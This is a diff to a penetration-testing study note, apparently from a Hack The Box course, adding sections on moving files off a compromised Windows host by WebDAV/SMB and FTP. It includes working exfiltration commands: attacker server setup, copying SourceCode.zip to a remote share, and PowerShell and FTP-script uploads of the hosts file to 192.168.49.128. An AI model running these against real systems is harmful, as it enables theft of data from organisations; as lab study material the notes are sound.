@@ -9,6 +9,7 @@
         - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode-1)
         - [PowerShell Web Uploads](#powershell-web-uploads)
         - [SMB Uploads](#smb-uploads)
+        - [FTP Uploads](#ftp-uploads)
 ## Windows File Transfer Methods
 ### Download Operations
 #### PowerShell Base64 Encode & Decode
@@ -199,6 +200,44 @@ abdeonix@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4
     ```
 
 #### SMB Uploads
+- Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.
+- An alternative is to run SMB over HTTP with WebDav
+- The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
+- When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP
+
+- **Steps**
+    - Our attacking box:
+        - Configuring WebDav Server: `sudo pip3 install wsgidav cheroot`
+        - Setup the server: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
+    - Target:
+        - Connecting to the Webdav Share: `dir \\192.168.49.128\sharefolder`
+        - Upload file `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`
 
 
+#### FTP Uploads
+
+- **Steps**
+     - Our attacking box:
+        - Setup the server: `sudo python3 -m pyftpdlib --port 21 --write`
+    - Target:
+        - Powershell upload file: `PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
+
+> [!TIP]
+> We can create a Command File for the FTP Client to Upload a File If we have not interactive shell
+> ```
+> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+> C:\htb> echo USER anonymous >> ftpcommand.txt
+> C:\htb> echo binary >> ftpcommand.txt
+> C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+> C:\htb> echo bye >> ftpcommand.txt
+> C:\htb> ftp -v -n -s:ftpcommand.txt
+> ftp> open 192.168.49.128
+> 
+> Log in with USER and PASS first.
+> 
+> 
+> ftp> USER anonymous
+> ftp> PUT c:\windows\system32\drivers\etc\hosts
+> ftp> bye
+> ```
 
